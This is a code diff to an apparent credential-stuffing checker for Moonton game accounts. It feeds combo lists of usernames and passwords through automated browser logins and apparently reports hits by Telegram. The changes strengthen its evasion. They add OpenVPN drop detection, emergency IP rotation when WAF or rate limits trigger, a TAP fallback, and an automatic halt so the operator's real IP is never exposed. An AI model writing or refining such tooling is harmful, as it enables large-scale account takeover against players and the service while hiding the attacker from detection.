@@ -165,7 +165,7 @@ def _acquire_instance_lock():
             except Exception:
                 pass
             if getattr(e, 'errno', None) in (38, 95, 22):
-                return fh
+                return None
         try:
             fh.seek(0)
             old_pid = fh.read(64).strip() or "?"
@@ -252,16 +252,22 @@ def _kill_pid_tree(pid: int | None):
         pass
 
 def _kill_driver_tree():
-    """Terminate tracked driver/browser/OpenVPN PID trees without withdrawing active license mid-run."""
-    global _driver_pid, _ovpn_pid
-    pid, opid = _driver_pid, _ovpn_pid
+    """Terminate tracked driver/browser PID tree without touching active OpenVPN."""
+    global _driver_pid
+    pid = _driver_pid
     _driver_pid = None
-    _ovpn_pid = None
     _kill_pid_tree(pid)
+
+def _kill_ovpn_tree():
+    """Emergency-kill tracked OpenVPN PID tree on process exit."""
+    global _ovpn_pid
+    opid = _ovpn_pid
+    _ovpn_pid = None
     _kill_pid_tree(opid)
 
 def _emergency_cleanup():
     _kill_driver_tree()
+    _kill_ovpn_tree()
     if _LICENSE_SESSION_ACTIVE:
         withdraw_cloak_license()
 
@@ -2052,6 +2058,7 @@ class VpnCoordinator:
         self._ovpn_mgmt_port = 0
         self.ovpn_disable_dco = False
         self.ovpn_ignore_dns_block = False
+        self.ovpn_started = False
         self.ovpn_failed = False
         if self.ovpn_dir:
             d_abs = os.path.abspath(self.ovpn_dir)
@@ -2311,7 +2318,7 @@ class VpnCoordinator:
         p_out(f"{c(CYAN)}[*] Menguji {total} config OpenVPN ke API Moonton (sekali per satu)...{W}")
         live: list[tuple[int, str, str]] = []
         fatal_perm = False
-        tried_win_diag = False
+        win_diag_tries = 0
         for idx, cfg in enumerate(self.ovpn_files, 1):
             name = os.path.basename(cfg)
             ok_tun, tun_msg = await self.start_ovpn(cfg_override=cfg, timeout_s=20.0)
@@ -2333,15 +2340,17 @@ class VpnCoordinator:
                         break
                     continue
             ok_mt, mt_reason, ms = await _probe_direct_moonton_ms(timeout_s=6.0)
-            if (not ok_mt) and os.name == 'nt' and not tried_win_diag:
-                tried_win_diag = True
+            if (not ok_mt) and os.name == 'nt' and win_diag_tries < 2:
+                win_diag_tries += 1
+                dco_was_forced = self.ovpn_disable_dco
                 await self.stop_ovpn()
-                p_out(f" {c(GOLD)}[*] {name} konek tapi tidak tembus ({mt_reason}) -> coba fallback TAP (--disable-dco)...{W}")
-                self.ovpn_disable_dco = True
-                ok2, _ = await self.start_ovpn(cfg_override=cfg, timeout_s=20.0)
-                if ok2:
-                    ok_mt, mt_reason, ms = await _probe_direct_moonton_ms(timeout_s=6.0)
-                if ok_mt:
+                if not dco_was_forced:
+                    p_out(f" {c(GOLD)}[*] {name} konek tapi tidak tembus ({mt_reason}) -> coba fallback TAP (--disable-dco)...{W}")
+                    self.ovpn_disable_dco = True
+                    ok2, _ = await self.start_ovpn(cfg_override=cfg, timeout_s=20.0)
+                    if ok2:
+                        ok_mt, mt_reason, ms = await _probe_direct_moonton_ms(timeout_s=6.0)
+                if ok_mt and not dco_was_forced:
                     p_out(f" {c(GREEN)}[*] Mode TAP (--disable-dco) berhasil menembus API Moonton! ✓{W}")
                 else:
                     await self.stop_ovpn()
@@ -2356,7 +2365,7 @@ class VpnCoordinator:
                         if ok3:
                             raw_ip_chk = await fetch_public_ip(timeout_s=3.0)
                             p_out(f" {c(GOLD)}[DIAG] Exit IP check saat tunnel aktif: {raw_ip_chk}{W}")
-                        self.ovpn_disable_dco = False
+                        self.ovpn_disable_dco = dco_was_forced
                         self.ovpn_ignore_dns_block = False
             ip_str = ''
             if ok_mt and self.ip_check:
@@ -2392,6 +2401,7 @@ class VpnCoordinator:
             if ok:
                 ok_mt, mt_reason, ms = await _probe_direct_moonton_ms(timeout_s=6.0)
                 if ok_mt:
+                    self.ovpn_started = True
                     if self.ip_check:
                         new_ip = await fetch_public_ip(timeout_s=3.0)
                         if new_ip != 'unknown':
@@ -2423,14 +2433,44 @@ class VpnCoordinator:
             return f"VPN · {self.current_ip}"
         return "VPN · Direct"
 
+    async def ensure_ovpn_alive(self, browser_state: dict | None, stats_dict: dict) -> bool:
+        if self.ovpn_failed:
+            raise RuntimeError("OpenVPN rotation failed - stopping worker to protect IP")
+        if not (self.ovpn_files and self.ovpn_started):
+            return True
+        if self.rotating or not self.gate.is_set():
+            try:
+                await asyncio.wait_for(self.gate.wait(), timeout=320.0)
+            except asyncio.TimeoutError:
+                pass
+            if self.ovpn_failed:
+                raise RuntimeError("OpenVPN rotation failed - stopping worker to protect IP")
+        if self._ovpn_proc is None or self._ovpn_proc.returncode is not None:
+            _LIVE_LOGS.append(f" {c(RED)}!{W}  {c(RED)}OpenVPN terputus mid-run -> rotasi darurat...{W}")
+            await self.coordinate('ovpn_drop', self.epoch, browser_state, stats_dict)
+            if self.ovpn_failed:
+                raise RuntimeError("OpenVPN rotation failed - stopping worker to protect IP")
+        return True
+
     async def on_waf_or_rate(self, seen_epoch: int, reason: str, browser_state: dict | None, stats_dict: dict) -> bool:
+        if self.ovpn_failed:
+            raise RuntimeError("OpenVPN rotation failed - stopping worker to protect IP")
         if seen_epoch != self.epoch:
+            if self.rotating or not self.gate.is_set():
+                try:
+                    await asyncio.wait_for(self.gate.wait(), timeout=320.0)
+                except asyncio.TimeoutError:
+                    pass
+                if self.ovpn_failed:
+                    raise RuntimeError("OpenVPN rotation failed - stopping worker to protect IP")
             return True
         if self.rotating:
             try:
                 await asyncio.wait_for(self.gate.wait(), timeout=320.0)
             except asyncio.TimeoutError:
                 pass
+            if self.ovpn_failed:
+                raise RuntimeError("OpenVPN rotation failed - stopping worker to protect IP")
             return True
         self.consec_waf_rate += 1
         if self.consec_waf_rate < self.waf_threshold:
@@ -2439,9 +2479,11 @@ class VpnCoordinator:
 
     async def coordinate(self, trigger: str, seen_epoch: int, browser_state: dict | None, stats_dict: dict) -> bool:
         async with self.lock:
+            if self.ovpn_failed:
+                raise RuntimeError("OpenVPN rotation failed - stopping worker to protect IP")
             if seen_epoch != self.epoch:
                 return True
-            if not trigger.startswith('proactive') and self.consec_waf_rate < self.waf_threshold:
+            if not trigger.startswith(('proactive', 'ovpn_drop')) and self.consec_waf_rate < self.waf_threshold:
                 return False
             self.rotating = True
             self.gate.clear()
@@ -2574,7 +2616,7 @@ class VpnCoordinator:
                         _LIVE_LOGS.append(f" {c(GOLD)}!{W}  {c(GOLD)}VPN unconfirmed ({self.current_ip}){W}")
                 self.epoch += 1
             finally:
-                stats_dict['status'] = prev_status if prev_status != 'WAF_WAIT' else 'RUNNING'
+                stats_dict['status'] = 'WAF_WAIT' if self.ovpn_failed else (prev_status if prev_status != 'WAF_WAIT' else 'RUNNING')
                 self.rotating = False
                 self.gate.set()
                 _PERF.resume()
@@ -3426,13 +3468,18 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
             worker_epoch += 1
         await _close_ctx()
 
-        if vpn_coord is not None and not vpn_coord.gate.is_set():
-            t_vpn_lk = time.monotonic()
-            try:
-                await asyncio.wait_for(vpn_coord.gate.wait(), timeout=320.0)
-            except asyncio.TimeoutError:
+        if vpn_coord is not None:
+            if vpn_coord.ovpn_failed:
                 return False
-            _PERF.record_stall('lock', time.monotonic() - t_vpn_lk)
+            if not vpn_coord.gate.is_set():
+                t_vpn_lk = time.monotonic()
+                try:
+                    await asyncio.wait_for(vpn_coord.gate.wait(), timeout=320.0)
+                except asyncio.TimeoutError:
+                    return False
+                _PERF.record_stall('lock', time.monotonic() - t_vpn_lk)
+                if vpn_coord.ovpn_failed:
+                    return False
 
         if browser_state is not None:
             if not browser_state['gate'].is_set():
@@ -3477,10 +3524,9 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                 return False
             if attempt > 1:
                 worker_epoch += 1
-            if vpn_coord is not None and not vpn_coord.gate.is_set():
-                try:
-                    await asyncio.wait_for(vpn_coord.gate.wait(), timeout=320.0)
-                except asyncio.TimeoutError:
+            if vpn_coord is not None:
+                await vpn_coord.ensure_ovpn_alive(browser_state, stats)
+                if vpn_coord.ovpn_failed:
                     return False
             rot_user_info = None
             if pool:
@@ -3738,6 +3784,8 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
         for t in range(max_tries):
             if wave_limit and stats['checked'] >= wave_limit:
                 return False
+            if vpn_coord and vpn_coord.ovpn_failed:
+                return False
             seen_ep = vpn_coord.epoch if vpn_coord else 0
             try:
                 if await open_context_and_page(rotate_ip=(rotate_ip or t > 0)):
@@ -3747,7 +3795,10 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                         stats['waf'] += 1
                         await vpn_coord.on_waf_or_rate(seen_ep, 'init_slider', browser_state, stats)
             except Exception:
-                pass
+                if vpn_coord and vpn_coord.ovpn_failed:
+                    raise
+            if vpn_coord and vpn_coord.ovpn_failed:
+                return False
             await _close_ctx()
             await asyncio.sleep(0.5 * (t + 1))
         return False
@@ -3819,6 +3870,8 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
             requeued = False
             try:
                 while True:
+                    if vpn_coord is not None:
+                        await vpn_coord.ensure_ovpn_alive(browser_state, stats)
                     need_recover_gen = None
                     p_tab = None
                     can_create_p2 = False
@@ -3914,6 +3967,8 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                     t_try = time.monotonic()
                     seen_vpn_ep = vpn_coord.epoch if vpn_coord else 0
                     try:
+                        if vpn_coord and vpn_coord.ovpn_failed:
+                            raise RuntimeError("OpenVPN rotation failed - stopping worker to protect IP")
                         kind, res_data = await do_login_via_browser(p_tab, ctx, u, pw, wid, waf_lock=waf_lock)
                     except Exception as ex:
                         kind, res_data = 'ERR', {'message': str(ex)[:60]}
@@ -3954,8 +4009,9 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                             await send_tg(tg_msg)
                         if not (wave_limit and stats['checked'] >= wave_limit):
                             if vpn_coord and vpn_coord.should_rotate_proactive(stats['checked']) and vpn_coord.epoch == seen_vpn_ep:
+                                pre_vpn_gen = ctx_gen
                                 if await vpn_coord.coordinate('proactive', seen_vpn_ep, browser_state, stats):
-                                    await _recover_ctx(ctx_gen, 'rotate')
+                                    await _recover_ctx(pre_vpn_gen, 'rotate')
                             elif ctx_accts >= ACCOUNTS_PER_CTX or (browser_state is not None and browser_state['recycling']):
                                 await _recover_ctx(my_gen, 'periodic_rotate')
                         break
@@ -3969,6 +4025,8 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                                 await asyncio.wait_for(vpn_coord.gate.wait(), timeout=320.0)
                             except asyncio.TimeoutError:
                                 pass
+                        if vpn_coord and vpn_coord.ovpn_failed:
+                            raise RuntimeError("OpenVPN rotation failed - stopping worker to protect IP")
                         if my_gen == ctx_gen:
                             await _recover_ctx(my_gen, 'rotate')
                         await asyncio.sleep(0.1)
@@ -4198,7 +4256,13 @@ async def async_main():
         plat = _detect_platform()
         assert plat['tag'] in ('Windows', 'Termux-Native', 'Termux-Proot', 'Linux')
         vc = VpnCoordinator(waf_threshold=2, waf_cooldown=3.0, ip_check=False)
-        assert vc.consec_waf_rate == 0 and vc.label() == 'VPN · Direct'
+        assert vc.consec_waf_rate == 0 and vc.label() == 'VPN · Direct' and not vc.ovpn_started
+        vc.ovpn_failed = True
+        try:
+            await vc.ensure_ovpn_alive(None, stats)
+            raise AssertionError("ensure_ovpn_alive must fail when ovpn_failed=True")
+        except RuntimeError:
+            pass
         print("[✓] All self-tests passed successfully!")
         return
 
@@ -4649,11 +4713,12 @@ async def async_main():
             withdraw_cloak_license()
             p_out(f"{c(GRAY)}[*] License key CloakBrowser ditarik dari device ✓{W}")
         if vpn_coord is not None:
-            if vpn_coord._ovpn_proc is not None:
+            vpn_coord.ovpn_started = False
+            if vpn_coord._ovpn_proc is not None or vpn_coord.ovpn_files:
                 try:
                     await vpn_coord.stop_ovpn()
                 except BaseException:
-                    _kill_driver_tree()
+                    _kill_ovpn_tree()
             try:
                 await vpn_coord.restore_warp_if_needed()
             except BaseException:
@@ -4679,7 +4744,10 @@ async def async_main():
         _done_rows.append(f" {c(GOLD)}BOTTLENECK   {W} : {_bn}")
     _print_box("CHECK COMPLETE", _done_rows, bc=(GOLD if aborted_on_errors else GREEN))
     if aborted_on_errors:
-        p_out(f"{c(GOLD)}[!] Dihentikan lebih awal: worker berhenti atau gagal refresh (sisa {combo_q.qsize():,} akun belum diperiksa).{W}")
+        if vpn_coord and vpn_coord.ovpn_failed:
+            p_out(f"{c(RED)}[!] Dihentikan otomatis: semua config OpenVPN gagal rotasi (IP asli dilindungi, sisa {combo_q.qsize():,} akun belum diperiksa).{W}")
+        else:
+            p_out(f"{c(GOLD)}[!] Dihentikan lebih awal: worker berhenti atau gagal refresh (sisa {combo_q.qsize():,} akun belum diperiksa).{W}")
 
 def main():
     try:
